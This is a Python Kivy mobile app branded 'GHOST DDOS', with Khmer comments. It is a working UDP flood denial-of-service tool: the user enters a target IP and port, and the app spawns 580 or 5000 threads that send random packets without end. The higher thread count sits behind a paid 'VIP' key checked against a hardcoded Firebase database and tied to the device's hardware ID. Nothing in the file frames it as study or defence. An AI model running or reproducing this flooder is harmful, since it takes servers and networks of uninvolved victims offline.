import socket
import threading
import random
import requests
import datetime
import uuid
from kivy.app import App
from kivy.uix.screenmanager import ScreenManager, Screen
from kivy.uix.boxlayout import BoxLayout
from kivy.uix.label import Label
from kivy.uix.textinput import TextInput
from kivy.uix.button import Button
from kivy.core.window import Window
from kivy.utils import get_color_from_hex

# កំណត់ទំហំអេក្រង់
Window.size = (360, 640)
Window.clearcolor = get_color_from_hex('#0A0A0A')

# URL Firebase របស់បង (ថែម /keys.json)
DB_URL = "https://data-3b12e-default-rtdb.asia-southeast1.firebasedatabase.app/keys.json"

# --- ទំព័រជ្រើសរើស Option (Free ឬ VIP) ---
class MenuScreen(Screen):
    def __init__(self, **kwargs):
        super().__init__(**kwargs)
        layout = BoxLayout(orientation='vertical', padding=40, spacing=20)
        
        layout.add_widget(Label(text="[b][color=FFD700]GHOST DDOS[/color][/b]", markup=True, font_size='35sp'))
        layout.add_widget(Label(text="CHOOSE YOUR OPTION", font_size='14sp', color=(0.7, 0.7, 0.7, 1)))

        # ប៊ូតុង FREE
        btn_free = Button(text="FREE MODE\n(580 Threads)", halign='center', background_color=get_color_from_hex('#333333'), size_hint_y=None, height=100)
        btn_free.bind(on_press=self.go_free)
        layout.add_widget(btn_free)

        # ប៊ូតុង VIP
        btn_vip = Button(text="VIP MODE\n(5000+ Threads)", halign='center', background_color=get_color_from_hex('#FFD700'), color=(0,0,0,1), bold=True, size_hint_y=None, height=100)
        btn_vip.bind(on_press=self.go_vip)
        layout.add_widget(btn_vip)

        self.add_widget(layout)

    def go_free(self, instance):
        self.manager.get_screen('attack').mode = "FREE"
        self.manager.get_screen('attack').threads = 580
        self.manager.current = 'attack'

    def go_vip(self, instance):
        self.manager.current = 'login'

# --- ទំព័របញ្ចូល Key សម្រាប់ VIP ---
class LoginScreen(Screen):
    def __init__(self, **kwargs):
        super().__init__(**kwargs)
        layout = BoxLayout(orientation='vertical', padding=30, spacing=15)
        
        layout.add_widget(Label(text="VIP ACTIVATION", font_size='24sp', bold=True, color=get_color_from_hex('#FFD700')))
        
        self.hwid = str(uuid.getnode())
        layout.add_widget(Label(text=f"Your ID: {self.hwid}", font_size='10sp'))

        self.key_input = TextInput(hint_text="Enter VIP Key", multiline=False, size_hint_y=None, height=50)
        layout.add_widget(self.key_input)

        self.status = Label(text="Waiting for key...", font_size='12sp')
        layout.add_widget(self.status)

        btn_verify = Button(text="VERIFY KEY", background_color=get_color_from_hex('#FFD700'), color=(0,0,0,1), bold=True, size_hint_y=None, height=60)
        btn_verify.bind(on_press=self.verify_key)
        layout.add_widget(btn_verify)

        btn_back = Button(text="BACK", size_hint_y=None, height=40, background_color=(0.2,0.2,0.2,1))
        btn_back.bind(on_press=self.go_back)
        layout.add_widget(btn_back)

        self.add_widget(layout)

    def verify_key(self, instance):
        user_key = self.key_input.text.strip()
        try:
            res = requests.get(DB_URL).json()
            if res and user_key in res:
                data = res[user_key]
                if data['hwid'] == "NONE" or data['hwid'] == self.hwid:
                    if data['hwid'] == "NONE":
                        requests.patch(f"https://data-3b12e-default-rtdb.asia-southeast1.firebasedatabase.app/keys/{user_key}.json", json={"hwid": self.hwid})
                    
                    self.manager.get_screen('attack').mode = "VIP"
                    self.manager.get_screen('attack').threads = 5000
                    self.manager.current = 'attack'
                else: self.status.text = "❌ Key used on other device!"
            else: self.status.text = "❌ Invalid Key!"
        except: self.status.text = "🌐 Connection Error!"

    def go_back(self, instance): self.manager.current = 'menu'

# --- ទំព័រ Attack ---
class AttackScreen(Screen):
    mode = "FREE"
    threads = 580

    def on_enter(self):
        self.clear_widgets()
        layout = BoxLayout(orientation='vertical', padding=20, spacing=15)
        
        layout.add_widget(Label(text=f"MODE: {self.mode}", font_size='20sp', bold=True, color=(0,1,0,1) if self.mode=="VIP" else (1,1,1,1)))
        
        self.ip_input = TextInput(hint_text="Target IP", multiline=False, size_hint_y=None, height=50)
        self.port_input = TextInput(hint_text="Port", multiline=False, size_hint_y=None, height=50)
        layout.add_widget(self.ip_input)
        layout.add_widget(self.port_input)

        self.status = Label(text=f"Ready to launch {self.threads} threads")
        layout.add_widget(self.status)

        btn_launch = Button(text="LAUNCH ATTACK", background_color=get_color_from_hex('#FF0000'), bold=True, size_hint_y=None, height=60)
        btn_launch.bind(on_press=self.start_attack)
        layout.add_widget(btn_launch)

        self.add_widget(layout)

    def attack_proc(self, ip, port):
        p = random._urandom(1024)
        while True:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                s.sendto(p, (ip, int(port)))
            except: break

    def start_attack(self, instance):
        ip = self.ip_input.text.strip()
        port = self.port_input.text.strip()
        if ip and port:
            self.status.text = f"🚀 Attacking {ip} with {self.threads} threads..."
            for _ in range(self.threads):
                t = threading.Thread(target=self.attack_proc, args=(ip, port))
                t.daemon = True
                t.start()

# --- Main App ---
class GhostApp(App):
    def build(self):
        sm = ScreenManager()
        sm.add_widget(MenuScreen(name='menu'))
        sm.add_widget(LoginScreen(name='login'))
        sm.add_widget(AttackScreen(name='attack'))
        return sm

if __name__ == "__main__":
    GhostApp().run()